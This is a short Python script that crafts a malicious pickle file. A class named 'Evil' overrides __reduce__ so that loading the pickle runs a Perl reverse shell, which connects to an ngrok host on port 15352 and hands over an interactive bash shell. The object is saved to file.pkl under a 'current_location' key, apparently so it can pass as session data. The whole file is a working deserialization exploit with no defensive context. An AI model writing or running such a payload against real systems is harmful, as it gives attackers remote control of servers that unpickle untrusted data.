import pickle
import os
from base64 import b64encode, b64decode

class Evil(object):
    result = ""
    def __str__(self):
        return self.result
    def __reduce__(self):
        result = (os.system,("perl -e 'use Socket;$i=\"0.tcp.ap.ngrok.io\";$p=15352;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'",))
        return result
   

e = Evil()
with open('file.pkl', 'wb+') as file:
      
    # A new file will be created
    pickle.dump({"current_location": e}, file)

# with open('file.pkl', 'rb') as file:
#   loaded_session = pickle.load(file)
#   print(loaded_session)